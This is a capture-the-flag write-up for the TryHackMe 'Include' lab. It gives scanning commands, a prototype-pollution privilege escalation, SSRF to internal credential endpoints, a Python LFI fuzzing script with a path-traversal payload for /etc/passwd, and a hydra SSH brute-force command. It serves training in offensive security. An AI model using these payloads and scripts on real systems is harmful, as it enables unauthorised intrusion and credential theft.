## THM CTF - Include

Flags:

> What is the flag value after logging in to the ```SysMon``` app?

> What is the content of the hidden text file in ```/var/www/html```?

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   include.thm
```
***It’s important to note that if we’re unable to navigate the site correctly, we can always use the IP address as a backup.***

Now we can proceed with an ```Nmap``` scan.
```
sudo nmap -sS -T4 include.thm -p-
```
We discovered three open ports, and we can list the services they provide.
```
sudo nmap -sS -p22,25,110,143,993,995,4000,50000 -sV -T4 include.thm
```

These are the results:
```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp     Postfix smtpd
110/tcp   open  pop3     Dovecot pop3d
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
4000/tcp  open  http     Node.js (Express middleware)
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
```
We can start navigating the two site we've found on ```port 4000``` and ```50000```

```Port 4000``` site is a login page, and trying to login with guest credentials provided by the page itself, we are able to access this site.
```
Post target: http://include.thm:4000/signin
Payload:
{
	"name": "guest",
	"password": "guest"
}
Cookies:
{
	"Request Cookies": {
		"connect.sid": "s:xxxxxxxxxxxxxxxx",
		"PHPSESSID": "xxxxxxxxx"
	}
}
Invalid response (signin):
Incorrect name or password
```
Port 50000 leads us to a restricted site with an index.php page and a login page that we can immediately test.
```
Post target: http://include.thm:50000/login.php
Payload:
{
	"username": "admin",
	"password": "admin"
}
Cookies:
{
	"Request Cookies": {
		"connect.sid": "s:xxxxxxxxxxxxxxxx",
		"PHPSESSID": "xxxxxxxxx"
	}
}
Invalid response (login.php):
Login credentials incorrect
```
We can proceed with ```Gobuster``` on both sites.
```
gobuster dir -u http://include.thm:4000 -w /usr/share/wordlists/dirb/common.txt -x html,js,txt,php,db,json,log
```
and
```
gobuster dir -u http://include.thm:50000 -w /usr/share/wordlists/dirb/common.txt -x html,js,txt,php,db,json,log
```

#### Port 4000

Nothing interesting except for ```/signup``` page that return an ```internal server error (code 500)```.

#### Port 50000

Readable folders:
```
/templates/
/uploads/
```
Notable pages:
```
auth.php
api.php
dashboard.php
profile.php
```
For now it's enough.
We can now explore the guest area on ```port 4000```.

#### Guest area on port 4000

Exploring the site, we discover some input area to test.
We try a classic XSS attack:
```
<script>alter('Test')</script>
```
without success.

At this point we can try to elevate our privileges to Admin thanks to ```Prototype Pollution```.
After some attempts, we can finally achieve our objective by adding:
```
Activity type: "isAdmin"
Activity name: true
```
Obtaining some new menu voices.

In the API section we can find some important information.
```
http://127.0.0.1:5000/internal-api
Response:
{
  "secretKey": "superSecretKey123",
  "confidentialInfo": "This is very confidential."
}
```
and
```
http://127.0.0.1:5000/getAllAdmins101099991
Response:
{
    "ReviewAppUsername": "admin",
    "ReviewAppPassword": "xxxxxx",
    "SysMonAppUsername": "administrator",
    "SysMonAppPassword": "xxxxxxxxx",
}
```
In the Settings section we can find a module that can might be used to further investigate these two internal links.

We can try to insert the URL discovered before.
```
http://127.0.0.1:5000/getAllAdmins101099991
```
We receive the response:
```
data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=
```
Thanks to CyberChef we can convert this text from Base64 and obtain passwords for Admin (review App) and Administrator (SysMon) account.

{"ReviewAppUsername":"admin","ReviewAppPassword":"xxxxxxxxxxx","SysMonAppUsername":"administrator","SysMonAppPassword":"xxxxxxxxxxx"}

Logging in the ```SysMon``` app, we immediately find the first flag.

Now we need to find the second flag hidden in the ```/var/www/html``` folder.

We try enumerate some of the ```Gobuster``` findings.
After some attempts ```profile.php``` is the only one that seems promising.
In the ```SysMon``` page, there is a link to an image.
```
profile.php?img=profile.png
```
Maybe we can try some ```LFI (Local file inclusion) poisoning```.

```profile.png``` is a file in the folder uploads (discovered previously thanks to the ```Gobuster``` analysis).

After some unsuccessful manual attempts, we should try using long lists and some ```Python``` code.
```
cp /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt .
```
We can simplify the lists because we're looking only for /etc/passwd file.
```
cat LFI-Jhaddix.txt | grep -e 'passwd' > LFI-Jhaddix_short.txt
```
With this list we can execute the ```Python``` script.

<details>
<summary><h3>THM_Include_LFI_Poisoning.py</h3></summary>

```python
import requests

# Change these variables to suits your needs
# Set the target and port

target_ip = '10.10.47.92'
target_port = '50000'

# Set the cookies obtained after a successful login

connect_sid = 's%3AZzTlaCDVBh3QI1YW4p7R8v5ntvMN6ePt.IDg3kva70jRW%2BXcafps0%2BFSY0eXu4p1fN3rp5F6Dzgc'
phpsessid = 'prd7v21kdgn5uojfkn7tmbd1mu'

# Change the path and name of the list to be used

lfi_file = '/home/kali/Downloads/THM_Include/LFI-Jhaddix_short.txt'

# Do not touch these variables

target_uri = f'http://{target_ip}:{target_port}/profile.php?img='
cookies = {
    'connect.sid' : connect_sid,
    'PHPSESSID' : phpsessid

}

# Set-up the session using cookies 

session = requests.Session()
session.cookies.update(cookies)

# Read the file

try:
    with open(lfi_file, 'r') as file:
        for item in file:

            # Generate the request with a get method using list file payload

            request = session.get(f'{target_uri}{item.strip()}')

            # If the word 'root' (always found in the /etc/passwd file) is in the response, print the results and exit

            if 'root' in request.text:
                print(f'{target_uri}{item}')
                print(request.text)
                break

except FileNotFoundError:
    print(f"File not found: {lfi_file}")

print('End of file')

```

  
</details>

We finally find the correct answer:
```
http://include.thm:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

We are able to find two interesting users:
```
joshua
charles
```
Trying to connect to these tow account via SSH and using the super secret password found earlier,
```
ssh joshua@include.thm
password: superSecretKey123
```
We attempted the same approach with ```charles```, but unfortunately, we were unsuccessful.

Approaching the problem from a brute-force point-of-view, we achieve success in finding an entry point.
```
hydra -l joshua -P /usr/share/wordlists/rockyou.txt include.thm ssh
```
Now that we have the password we can login via ```SSH``` to the target machine.

Navigating to the target folder, we find the second flag.
